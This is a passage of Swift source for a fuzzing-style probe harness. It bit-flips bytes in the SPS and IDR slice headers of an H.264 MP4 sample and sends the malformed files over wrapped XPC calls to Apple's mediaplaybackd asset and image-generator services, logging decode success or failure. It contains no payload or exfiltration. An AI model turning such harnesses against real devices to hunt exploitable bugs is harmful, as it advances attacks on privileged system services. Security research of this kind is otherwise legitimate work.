            xq_set_event_handler(c) { [weak self] e in
                guard let self else { return }
                let d = self.describe(e)
                if d.contains("AIGDidGenerateCGImage") { gotFrame.pointee = true }
                if d.contains("AIGFailedToGenerateCGImage") { gotFail.pointee = true }
            }
            xq_resume(c)
            var tok: Int64 = 0
            if let ping = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
                ".ProcessName".withCString { k in
                    "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
                }
                if let r = sendSync(c, ping, timeout: 4.0) {
                    tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                    xq_release(r)
                }
                xq_release(ping)
            }
            return tok != 0 ? (c, tok) : nil
        }

        var indices: [Int] = [-1]
        for i in 0..<spsLen { indices.append(i) }

        for index in indices {
            let label = index < 0 ? "baseline" : "sps_b\(index)"
            let payload: Data
            if index < 0 { payload = original } else if let b = build(index) { payload = b } else { continue }
            gotFrame.pointee = false; gotFail.pointee = false
            guard let (ac, atok) = open("asset") else { emit("xss: [\(label)] asset conn failed"); continue }
            var assetOID: UInt64 = 0
            if let m = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63724242) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, atok) }
                payload.withUnsafeBytes { raw in
                    if let dd = xq_data_create(raw.baseAddress, raw.count) {
                        "BlockBufferData".withCString { xq_dictionary_set_value(m, $0, dd) }
                        xq_release(dd)
                    }
                }
                "FormatIdentifierType".withCString { xq_dictionary_set_uint64(m, $0, 0) }
                "FormatIdentifier".withCString { k in
                    "public.mpeg-4".withCString { v in xq_dictionary_set_string(m, k, v) }
                }
                if let opts = xq_dictionary_create(nil, nil, 0) {
                    ".CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
                    xq_release(opts)
                }
                if let r = sendSync(ac, m, timeout: 10.0) {
                    assetOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    xq_release(r)
                }
                xq_release(m)
            }
            guard assetOID != 0 else { emit("xss: [\(label)] no asset"); xq_release(ac); continue }

            if let s = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(s, $0, 0x6c6f6431) }
                ".Token".withCString { xq_dictionary_set_int64(s, $0, atok) }
                ".objectID".withCString { xq_dictionary_set_uint64(s, $0, assetOID) }
                ".PropertyName".withCString { k in
                    "assetProperty_Tracks".withCString { v in xq_dictionary_set_string(s, k, v) }
                }
                if let r = sendSync(ac, s, timeout: 8.0) { xq_release(r) }
                xq_release(s)
            }
            Thread.sleep(forTimeInterval: 0.8)
            let trackOID = assetOID &+ 256

            var fda: [UInt8] = []
            if let s = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(s, $0, 0x54637079) }
                ".Token".withCString { xq_dictionary_set_int64(s, $0, atok) }
                ".objectID".withCString { xq_dictionary_set_uint64(s, $0, trackOID) }
                ".PropertyName".withCString { k in
                    "FormatDescriptionArray".withCString { v in xq_dictionary_set_string(s, k, v) }
                }
                if let r = sendSync(ac, s, timeout: 5.0) {
                    let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                    if e == 0, let v = ".Value".withCString({ xq_dictionary_get_value(r, $0) }),
                       let p = xq_data_bytes(v) {
                        let n = xq_data_len(v)
                        fda = [UInt8](repeating: 0, count: n)
                        for i in 0..<n { fda[i] = p[i] }
                    }
                    xq_release(r)
                }
                xq_release(s)
            }
            if index < 0 { baseBytes = fda }

            var diffCount = -1, firstDiff = -1
            if !baseBytes.isEmpty && !fda.isEmpty {
                let n = min(baseBytes.count, fda.count)
                diffCount = 0
                for i in 0..<n where baseBytes[i] != fda[i] {
                    diffCount += 1
                    if firstDiff < 0 { firstDiff = i }
                }
                diffCount += abs(baseBytes.count - fda.count)
            }

            guard let (gc, gtok) = open("assetimagegenerator") else { xq_release(ac); continue }
            var genOID: UInt64 = 0
            if let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726561) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                "Asset".withCString { xq_dictionary_set_uint64(m, $0, assetOID) }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                if let r = sendSync(gc, m, timeout: 10.0) {
                    genOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    xq_release(r)
                }
                xq_release(opts); xq_release(m)
            }
            if genOID != 0, let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x72657131) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                ".objectID".withCString { xq_dictionary_set_uint64(m, $0, genOID) }
                if let t = cmTime(0, 24000) {
                    "ImageTime".withCString { xq_dictionary_set_value(m, $0, t) }
                    xq_release(t)
                }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                if let r = sendSync(gc, m, timeout: 12.0) { xq_release(r) }
                xq_release(opts); xq_release(m)
            }
            Thread.sleep(forTimeInterval: 1.6)
            var fnvText = "n/a"
            if !fda.isEmpty { fnvText = String(format: "%016llx", fnv(fda, fda.count)) }
            emit("xss: [\(label)] diff=\(diffCount) first=\(firstDiff) fnv=\(fnvText) frame=\(gotFrame.pointee) failed=\(gotFail.pointee)")
            xq_cancel(gc); xq_release(gc)
            xq_cancel(ac); xq_release(ac)
            Thread.sleep(forTimeInterval: 0.2)
        }
        gotFrame.deallocate(); gotFail.deallocate()
        emit("xss: done")
    }

    func spsRbspProbe() {
        emit("xsr: SPS RBSP decode and diff pairs")
        guard let mp4 = Bundle.main.url(forResource: "h264-main", withExtension: "mp4"),
              let original = try? Data(contentsOf: mp4) else {
            emit("xsr: sample missing"); return
        }
        var bytes = [UInt8](original)
        func findTag(_ tag: String) -> Int? {
            let t = Array(tag.utf8)
            var i = 4
            while i + 4 <= bytes.count {
                if bytes[i] == t[0] && bytes[i+1] == t[1] && bytes[i+2] == t[2] && bytes[i+3] == t[3] { return i }
                i += 1
            }
            return nil
        }
        guard let avcC = findTag("avcC") else { emit("xsr: no avcC"); return }
        let spsLen = (Int(bytes[avcC + 10]) << 8) | Int(bytes[avcC + 11])
        let spsStart = avcC + 12
        guard spsStart + spsLen <= bytes.count else { emit("xsr: bad sps"); return }
        emit("xsr: spsStart=\(spsStart) spsLen=\(spsLen) nalHeader=\(String(format: "%02x", bytes[spsStart]))")

        // Strip the NAL header, then remove emulation-prevention bytes.
        var rbsp = [UInt8]()
        var zeros = 0
        for i in 1..<spsLen {
            let b = bytes[spsStart + i]
            if zeros >= 2 && b == 0x03 { zeros = 0; continue }
            rbsp.append(b)
            zeros = (b == 0) ? zeros + 1 : 0
        }
        emit("xsr: rbspLen=\(rbsp.count) head=\(rbsp.prefix(8).map { String(format: "%02x", $0) }.joined())")

        // Bit reader over the RBSP.
        var bitPos = 0
        func bit() -> Int {
            guard bitPos / 8 < rbsp.count else { return 0 }
            let v = (Int(rbsp[bitPos / 8]) >> (7 - bitPos % 8)) & 1
            bitPos += 1
            return v
        }
        func u(_ n: Int) -> Int {
            var v = 0
            for _ in 0..<n { v = (v << 1) | bit() }
            return v
        }
        func ue() -> Int {
            var lead = 0
            while bit() == 0 && lead < 31 { lead += 1 }
            var v = 0
            for _ in 0..<lead { v = (v << 1) | bit() }
            return (1 << lead) - 1 + v
        }
        // Byte offset inside the NAL unit (header occupies index 0).
        func byteOff() -> Int { return 1 + bitPos / 8 }

        let profile = u(8)
        let constraints = u(8)
        let level = u(8)
        emit("xsr: profile_idc=\(profile) (byte \(byteOff() - 3)) constraint=0x" + String(format: "%02x", constraints) + " (byte \(byteOff() - 2)) level_idc=\(level) (byte \(byteOff() - 1))")

        let spsId = ue()
        emit("xsr: sps_id=\(spsId) (byte \(byteOff()))")
        if [100, 110, 122, 244, 44, 83, 86, 118, 128, 138, 139, 134, 135].contains(profile) {
            let chroma = ue()
            emit("xsr: chroma_format_idc=\(chroma) (byte \(byteOff()))")
            if chroma == 3 { _ = bit() }
            _ = ue()
            _ = ue()
            _ = bit()
            if bit() == 1 {
                let n = chroma != 3 ? 8 : 12
                for _ in 0..<n { _ = ue() }
            }
        }
        let log2MaxFrameNum = ue()
        emit("xsr: log2_max_frame_num_minus4=\(log2MaxFrameNum) (byte \(byteOff()))")
        let pocType = ue()
        emit("xsr: pic_order_cnt_type=\(pocType) (byte \(byteOff()))")
        if pocType == 0 {
            _ = ue()
        } else if pocType == 1 {
            _ = bit()
            _ = ue()
            _ = ue()
            let n = ue()
            for _ in 0..<n { _ = ue() }
        }
        _ = ue()
        _ = bit()
        let width = ue()
        let height = ue()
        emit("xsr: pic_width_in_mbs_minus1=\(width) -> \((width + 1) * 16) px (byte \(byteOff() - 1))")
        emit("xsr: pic_height_in_map_units_minus1=\(height) -> \((height + 1) * 16) px (byte \(byteOff() - 1))")

        func fnv(_ p: UnsafePointer<UInt8>, _ n: Int) -> UInt64 {
            var h: UInt64 = 0xcbf29ce484222325
            for i in 0..<n { h ^= UInt64(p[i]); h = h &* 0x100000001b3 }
            return h
        }
        func cmTime(_ value: Int64, _ scale: Int32) -> XObj? {
            var b = [UInt8](repeating: 0, count: 24)
            withUnsafeBytes(of: value.littleEndian) { raw in for (i, x) in raw.enumerated() { b[i] = x } }
            withUnsafeBytes(of: scale.littleEndian) { raw in for (i, x) in raw.enumerated() { b[8 + i] = x } }
            withUnsafeBytes(of: Int32(1).littleEndian) { raw in for (i, x) in raw.enumerated() { b[12 + i] = x } }
            return b.withUnsafeBytes { xq_data_create($0.baseAddress, 24) }
        }

        var baseBytes = [UInt8]()
        let gotFrame = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
        let gotFail = UnsafeMutablePointer<Bool>.allocate(capacity: 1)

        func open(_ svc: String) -> (XObj, Int64)? {
            let name = "com.apple.coremedia.mediaplaybackd.\(svc).xpc"
            guard let c = name.withCString({ xq_connection_create_service($0, queue, 0) }) else { return nil }
            xq_set_event_handler(c) { [weak self] e in
                guard let self else { return }
                let d = self.describe(e)
                if d.contains("AIGDidGenerateCGImage") { gotFrame.pointee = true }
                if d.contains("AIGFailedToGenerateCGImage") { gotFail.pointee = true }
            }
            xq_resume(c)
            var tok: Int64 = 0
            if let ping = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
                ".ProcessName".withCString { k in
                    "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
                }
                if let r = sendSync(c, ping, timeout: 4.0) {
                    tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                    xq_release(r)
                }
                xq_release(ping)
            }
            return tok != 0 ? (c, tok) : nil
        }

        for index in [-1, 1, 2, 3, 4, 5] {
            let label = index < 0 ? "baseline" : "sps_b\(index)"
            var payload = original
            if index >= 0 {
                var d = bytes
                d[spsStart + index] ^= 0xFF
                payload = Data(d)
            }
            gotFrame.pointee = false; gotFail.pointee = false
            guard let (ac, atok) = open("asset") else { emit("xsr: [\(label)] conn failed"); continue }
            var assetOID: UInt64 = 0
            if let m = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63724242) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, atok) }
                payload.withUnsafeBytes { raw in
                    if let dd = xq_data_create(raw.baseAddress, raw.count) {
                        "BlockBufferData".withCString { xq_dictionary_set_value(m, $0, dd) }
                        xq_release(dd)
                    }
                }
                "FormatIdentifierType".withCString { xq_dictionary_set_uint64(m, $0, 0) }
                "FormatIdentifier".withCString { k in
                    "public.mpeg-4".withCString { v in xq_dictionary_set_string(m, k, v) }
                }
                if let opts = xq_dictionary_create(nil, nil, 0) {
                    ".CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
                    xq_release(opts)
                }
                if let r = sendSync(ac, m, timeout: 10.0) {
                    assetOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    xq_release(r)
                }
                xq_release(m)
            }
            guard assetOID != 0 else { emit("xsr: [\(label)] no asset"); xq_release(ac); continue }
            if let s = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(s, $0, 0x6c6f6431) }
                ".Token".withCString { xq_dictionary_set_int64(s, $0, atok) }
                ".objectID".withCString { xq_dictionary_set_uint64(s, $0, assetOID) }
                ".PropertyName".withCString { k in
                    "assetProperty_Tracks".withCString { v in xq_dictionary_set_string(s, k, v) }
                }
                if let r = sendSync(ac, s, timeout: 8.0) { xq_release(r) }
                xq_release(s)
            }
            Thread.sleep(forTimeInterval: 0.8)
            let trackOID = assetOID &+ 256
            var fda: [UInt8] = []
            if let s = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(s, $0, 0x54637079) }
                ".Token".withCString { xq_dictionary_set_int64(s, $0, atok) }
                ".objectID".withCString { xq_dictionary_set_uint64(s, $0, trackOID) }
                ".PropertyName".withCString { k in
                    "FormatDescriptionArray".withCString { v in xq_dictionary_set_string(s, k, v) }
                }
                if let r = sendSync(ac, s, timeout: 5.0) {
                    let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                    if e == 0, let v = ".Value".withCString({ xq_dictionary_get_value(r, $0) }),
                       let p = xq_data_bytes(v) {
                        let n = xq_data_len(v)
                        fda = [UInt8](repeating: 0, count: n)
                        for i in 0..<n { fda[i] = p[i] }
                    }
                    xq_release(r)
                }
                xq_release(s)
            }
            if index < 0 { baseBytes = fda }

            var pairs = ""
            if !baseBytes.isEmpty && !fda.isEmpty {
                var shown = 0
                for i in 0..<min(baseBytes.count, fda.count) where baseBytes[i] != fda[i] {
                    if shown < 4 {
                        pairs += " (\(i):\(String(format: "%02x", baseBytes[i]))->\(String(format: "%02x", fda[i])))"
                        shown += 1
                    }
                }
            }

            guard let (gc, gtok) = open("assetimagegenerator") else { xq_release(ac); continue }
            var genOID: UInt64 = 0
            if let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726561) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                "Asset".withCString { xq_dictionary_set_uint64(m, $0, assetOID) }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                if let r = sendSync(gc, m, timeout: 10.0) {
                    genOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    xq_release(r)
                }
                xq_release(opts); xq_release(m)
            }
            if genOID != 0, let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x72657131) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                ".objectID".withCString { xq_dictionary_set_uint64(m, $0, genOID) }
                if let t = cmTime(0, 24000) {
                    "ImageTime".withCString { xq_dictionary_set_value(m, $0, t) }
                    xq_release(t)
                }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                if let r = sendSync(gc, m, timeout: 12.0) { xq_release(r) }
                xq_release(opts); xq_release(m)
            }
            Thread.sleep(forTimeInterval: 1.6)
            var fnvText = "n/a"
            if !fda.isEmpty { fnvText = String(format: "%016llx", fnv(fda, fda.count)) }
            emit("xsr: [\(label)] fnv=\(fnvText) pairs=\(pairs) frame=\(gotFrame.pointee) failed=\(gotFail.pointee)")
            xq_cancel(gc); xq_release(gc)
            xq_cancel(ac); xq_release(ac)
            Thread.sleep(forTimeInterval: 0.2)
        }
        gotFrame.deallocate(); gotFail.deallocate()
        emit("xsr: done")
    }

    func idrMapProbe() {
        emit("xim: IDR slice structure")
        guard let mp4 = Bundle.main.url(forResource: "h264-main", withExtension: "mp4"),
              let original = try? Data(contentsOf: mp4) else {
            emit("xim: sample missing"); return
        }
        var bytes = [UInt8](original)
        func findTag(_ tag: String) -> Int? {
            let t = Array(tag.utf8)
            var i = 4
            while i + 4 <= bytes.count {
                if bytes[i] == t[0] && bytes[i+1] == t[1] && bytes[i+2] == t[2] && bytes[i+3] == t[3] { return i }
                i += 1
            }
            return nil
        }
        func be32(_ p: Int) -> Int {
            guard p + 4 <= bytes.count else { return 0 }
            return (Int(bytes[p]) << 24) | (Int(bytes[p+1]) << 16) | (Int(bytes[p+2]) << 8) | Int(bytes[p+3])
        }
        guard let stco = findTag("stco"), let stsz = findTag("stsz"), let avcC = findTag("avcC") else {
            emit("xim: tables missing"); return
        }
        let offset = be32(stco + 12)
        let uniform = be32(stsz + 8)
        let size = uniform != 0 ? uniform : be32(stsz + 16)

        // --- Reusable bit reader for RBSP slices.
        func rbspOf(_ start: Int, _ len: Int, _ skipHeader: Bool) -> [UInt8] {
            var out = [UInt8]()
            var zeros = 0
            var i = skipHeader ? 1 : 0
            while i < len {
                let b = bytes[start + i]
                if zeros >= 2 && b == 0x03 { zeros = 0; i += 1; continue }
                out.append(b)
                zeros = (b == 0) ? zeros + 1 : 0
                i += 1
            }
            return out
        }

        // --- Parse SPS far enough for slice header decoding.
        let spsLen = (Int(bytes[avcC + 10]) << 8) | Int(bytes[avcC + 11])
        let spsStart = avcC + 12
        var sps = rbspOf(spsStart, spsLen, true)
        var p = 0
        func sbit() -> Int {
            guard p / 8 < sps.count else { return 0 }
            let v = (Int(sps[p / 8]) >> (7 - p % 8)) & 1
            p += 1
            return v
        }
        func su(_ n: Int) -> Int { var v = 0; for _ in 0..<n { v = (v << 1) | sbit() }; return v }
        func sue() -> Int {
            var lead = 0
            while sbit() == 0 && lead < 31 { lead += 1 }
            var v = 0
            for _ in 0..<lead { v = (v << 1) | sbit() }
            return (1 << lead) - 1 + v
        }
        _ = su(8); _ = su(8); _ = su(8)          // profile, constraints, level
        _ = sue()                                 // sps_id
        let log2FrameNum = sue()                  // log2_max_frame_num_minus4
        let pocType = sue()
        var log2PocLsb = 0
        if pocType == 0 { log2PocLsb = sue() }
        else if pocType == 1 { _ = sbit(); _ = sue(); _ = sue(); let n = sue(); for _ in 0..<n { _ = sue() } }
        _ = sue()                                 // max_num_ref_frames
        _ = sbit()                                // gaps_in_frame_num_value_allowed
        _ = sue()                                 // width in mbs
        _ = sue()                                 // height in map units
        let frameMbsOnly = sbit()
        emit("xim: sps log2FrameNum=\(log2FrameNum) pocType=\(pocType) log2PocLsb=\(log2PocLsb) frameMbsOnly=\(frameMbsOnly)")

        // --- Locate the IDR NAL in the first sample.
        var idrRel = -1, idrLen = 0
        var q = 0
        while q + 4 <= size {
            let len = (Int(bytes[offset + q]) << 24) | (Int(bytes[offset + q + 1]) << 16)
                    | (Int(bytes[offset + q + 2]) << 8) | Int(bytes[offset + q + 3])
            if len <= 0 || q + 4 + len > size { break }
            let type = Int(bytes[offset + q + 4] & 0x1F)
            if type == 5 { idrRel = q; idrLen = len; break }
            q += 4 + len
        }
        guard idrRel >= 0 else { emit("xim: no IDR"); return }
        let idrStart = offset + idrRel
        emit("xim: idr rel=\(idrRel) len=\(idrLen) nalHeader=\(String(format: "%02x", bytes[idrStart + 4]))")

        // --- Parse the slice header.
        var slice = rbspOf(idrStart + 4, idrLen, true)
        var s = 0
        func bbit() -> Int {
            guard s / 8 < slice.count else { return 0 }
            let v = (Int(slice[s / 8]) >> (7 - s % 8)) & 1
            s += 1
            return v
        }
        func bu(_ n: Int) -> Int { var v = 0; for _ in 0..<n { v = (v << 1) | bbit() }; return v }
        func bue() -> Int {
            var lead = 0
            while bbit() == 0 && lead < 31 { lead += 1 }
            var v = 0
            for _ in 0..<lead { v = (v << 1) | bbit() }
            return (1 << lead) - 1 + v
        }
        let firstMb = bue()
        let sliceType = bue()
        let ppsId = bue()
        let frameNum = bu(log2FrameNum + 4)
        if frameMbsOnly == 0 { _ = bbit() }
        let idrPicId = bue()
        let pocLsb = pocType == 0 ? bu(log2PocLsb + 4) : -1
        emit("xim: slice first_mb=\(firstMb) slice_type=\(sliceType) pps_id=\(ppsId) frame_num=\(frameNum) idr_pic_id=\(idrPicId) poc_lsb=\(pocLsb)")
        let parsedBytes = max(1, (s + 7) / 8)
        emit("xim: parsed header bytes=\(parsedBytes) of payload \(idrLen - 1)")

        // --- Mutations across the three regions.
        func build(_ kind: String) -> Data? {
            var d = bytes
            let hdr = idrStart + 4          // NAL header byte
            let body = idrStart + 5         // first RBSP byte
            switch kind {
            case "baseline":
                break
            case "nal_header":
                d[hdr] ^= 0xFF
            case "slice_first":
                d[body] ^= 0xFF
            case "slice_parsed":
                d[body + min(parsedBytes - 1, 3)] ^= 0xFF
            case "after_header":
                let off = body + parsedBytes
                if off < idrStart + 4 + idrLen { d[off] ^= 0xFF } else { return nil }
            case "after_header_8":
                let off = body + parsedBytes + 8
                if off < idrStart + 4 + idrLen { d[off] ^= 0xFF } else { return nil }
            case "mid_payload":
                let off = body + (idrLen - 1) / 2
                d[off] ^= 0xFF
            case "tail":
                d[idrStart + 4 + idrLen - 1] ^= 0xFF
            default:
                return nil
            }
            return Data(d)
        }
        func cmTime(_ value: Int64, _ scale: Int32) -> XObj? {
            var b = [UInt8](repeating: 0, count: 24)
            withUnsafeBytes(of: value.littleEndian) { raw in for (i, x) in raw.enumerated() { b[i] = x } }
            withUnsafeBytes(of: scale.littleEndian) { raw in for (i, x) in raw.enumerated() { b[8 + i] = x } }
            withUnsafeBytes(of: Int32(1).littleEndian) { raw in for (i, x) in raw.enumerated() { b[12 + i] = x } }
            return b.withUnsafeBytes { xq_data_create($0.baseAddress, 24) }
        }
        let gotFrame = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
        let gotFail = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
        func open(_ svc: String) -> (XObj, Int64)? {
            let name = "com.apple.coremedia.mediaplaybackd.\(svc).xpc"
            guard let c = name.withCString({ xq_connection_create_service($0, queue, 0) }) else { return nil }
            xq_set_event_handler(c) { [weak self] e in
                guard let self else { return }
                let d = self.describe(e)
                if d.contains("AIGDidGenerateCGImage") { gotFrame.pointee = true }
                if d.contains("AIGFailedToGenerateCGImage") { gotFail.pointee = true }
            }
            xq_resume(c)
            var tok: Int64 = 0
            if let ping = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
                ".ProcessName".withCString { k in
                    "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
                }
                if let r = sendSync(c, ping, timeout: 4.0) {
                    tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                    xq_release(r)
                }
                xq_release(ping)
            }
            return tok != 0 ? (c, tok) : nil
        }

        var baseFda: [UInt8] = []
        for kind in ["baseline", "nal_header", "slice_first", "slice_parsed",
                     "after_header", "after_header_8", "mid_payload", "tail"] {
            guard let payload = build(kind) else { emit("xim: [\(kind)] build failed"); continue }
            gotFrame.pointee = false; gotFail.pointee = false
            guard let (ac, atok) = open("asset") else { emit("xim: [\(kind)] conn failed"); continue }
            var assetOID: UInt64 = 0
            if let m = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63724242) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, atok) }
                payload.withUnsafeBytes { raw in
                    if let dd = xq_data_create(raw.baseAddress, raw.count) {
                        "BlockBufferData".withCString { xq_dictionary_set_value(m, $0, dd) }
                        xq_release(dd)
                    }
                }
                "FormatIdentifierType".withCString { xq_dictionary_set_uint64(m, $0, 0) }
                "FormatIdentifier".withCString { k in
                    "public.mpeg-4".withCString { v in xq_dictionary_set_string(m, k, v) }
                }
                if let opts = xq_dictionary_create(nil, nil, 0) {
                    ".CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
                    xq_release(opts)
                }
                if let r = sendSync(ac, m, timeout: 10.0) {
                    assetOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    xq_release(r)
                }
                xq_release(m)
            }
            guard assetOID != 0 else { emit("xim: [\(kind)] no asset"); xq_release(ac); continue }

            var fda: [UInt8] = []
            if let st = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(st, $0, 0x6c6f6431) }
                ".Token".withCString { xq_dictionary_set_int64(st, $0, atok) }
                ".objectID".withCString { xq_dictionary_set_uint64(st, $0, assetOID) }
                ".PropertyName".withCString { k in
                    "assetProperty_Tracks".withCString { v in xq_dictionary_set_string(st, k, v) }
                }
                if let r = sendSync(ac, st, timeout: 8.0) { xq_release(r) }
                xq_release(st)
            }
            Thread.sleep(forTimeInterval: 0.8)
            let trackOID = assetOID &+ 256
            if let st = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(st, $0, 0x54637079) }
                ".Token".withCString { xq_dictionary_set_int64(st, $0, atok) }
                ".objectID".withCString { xq_dictionary_set_uint64(st, $0, trackOID) }
                ".PropertyName".withCString { k in
                    "FormatDescriptionArray".withCString { v in xq_dictionary_set_string(st, k, v) }
                }
                if let r = sendSync(ac, st, timeout: 5.0) {
                    let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                    if e == 0, let v = ".Value".withCString({ xq_dictionary_get_value(r, $0) }),
                       let pp = xq_data_bytes(v) {
                        let n = xq_data_len(v)
                        fda = [UInt8](repeating: 0, count: n)
                        for i in 0..<n { fda[i] = pp[i] }
                    }
                    xq_release(r)
                }
                xq_release(st)
            }
            var fdaDiff = -1
            if kind == "baseline" { baseFda = fda }
            else if !baseFda.isEmpty && !fda.isEmpty {
                fdaDiff = 0
                for i in 0..<min(baseFda.count, fda.count) where baseFda[i] != fda[i] { fdaDiff += 1 }
            }

            guard let (gc, gtok) = open("assetimagegenerator") else { xq_release(ac); continue }
            var genOID: UInt64 = 0
            if let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726561) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                "Asset".withCString { xq_dictionary_set_uint64(m, $0, assetOID) }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                if let r = sendSync(gc, m, timeout: 10.0) {
                    genOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    xq_release(r)
                }
                xq_release(opts); xq_release(m)
            }
            if genOID != 0, let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x72657131) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                ".objectID".withCString { xq_dictionary_set_uint64(m, $0, genOID) }
                if let t = cmTime(0, 24000) {
                    "ImageTime".withCString { xq_dictionary_set_value(m, $0, t) }
                    xq_release(t)
                }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                if let r = sendSync(gc, m, timeout: 12.0) { xq_release(r) }
                xq_release(opts); xq_release(m)
            }
            Thread.sleep(forTimeInterval: 1.6)
            emit("xim: [\(kind)] fdaDiff=\(fdaDiff) frame=\(gotFrame.pointee) failed=\(gotFail.pointee)")
            xq_cancel(gc); xq_release(gc)
            xq_cancel(ac); xq_release(ac)
            Thread.sleep(forTimeInterval: 0.2)
        }
        gotFrame.deallocate(); gotFail.deallocate()
        emit("xim: done")
    }

    func idrBoundaryProbe() {
        emit("xib: exact slice header boundary")
        guard let mp4 = Bundle.main.url(forResource: "h264-main", withExtension: "mp4"),
              let original = try? Data(contentsOf: mp4) else {
            emit("xib: sample missing"); return
        }
        var bytes = [UInt8](original)
        func findTag(_ tag: String) -> Int? {
            let t = Array(tag.utf8)
            var i = 4
            while i + 4 <= bytes.count {
                if bytes[i] == t[0] && bytes[i+1] == t[1] && bytes[i+2] == t[2] && bytes[i+3] == t[3] { return i }
                i += 1
            }
            return nil
        }
        func be32(_ p: Int) -> Int {
            guard p + 4 <= bytes.count else { return 0 }
            return (Int(bytes[p]) << 24) | (Int(bytes[p+1]) << 16) | (Int(bytes[p+2]) << 8) | Int(bytes[p+3])
        }
        guard let stco = findTag("stco"), let stsz = findTag("stsz"), let avcC = findTag("avcC") else {
            emit("xib: tables missing"); return
        }
        let offset = be32(stco + 12)
        let uniform = be32(stsz + 8)
        let size = uniform != 0 ? uniform : be32(stsz + 16)

        func rbsp(_ start: Int, _ len: Int) -> [UInt8] {
            var out = [UInt8]()
            var zeros = 0
            var i = 1
            while i < len {
                let b = bytes[start + i]
                if zeros >= 2 && b == 0x03 { zeros = 0; i += 1; continue }
                out.append(b)
                zeros = (b == 0) ? zeros + 1 : 0
                i += 1
            }
            return out
        }
        // Bit reader over a byte array.
        final class BR {
            var d: [UInt8]; var p = 0
            init(_ d: [UInt8]) { self.d = d }
            func bit() -> Int {
                guard p / 8 < d.count else { return 0 }
                let v = (Int(d[p / 8]) >> (7 - p % 8)) & 1
                p += 1
                return v
            }
            func u(_ n: Int) -> Int { var v = 0; for _ in 0..<n { v = (v << 1) | bit() }; return v }
            func ue() -> Int {
                var lead = 0
                while bit() == 0 && lead < 31 { lead += 1 }
                var v = 0
                for _ in 0..<lead { v = (v << 1) | bit() }
                return (1 << lead) - 1 + v
            }
            func se() -> Int {
                let k = ue()
                return (k % 2 == 0) ? -(k / 2) : (k + 1) / 2
            }
        }

        // SPS
        let spsLen = (Int(bytes[avcC + 10]) << 8) | Int(bytes[avcC + 11])
        let spsStart = avcC + 12
        let sr = BR(rbsp(spsStart, spsLen))
        _ = sr.u(8); _ = sr.u(8); _ = sr.u(8)
        _ = sr.ue()
        let log2FrameNum = sr.ue()
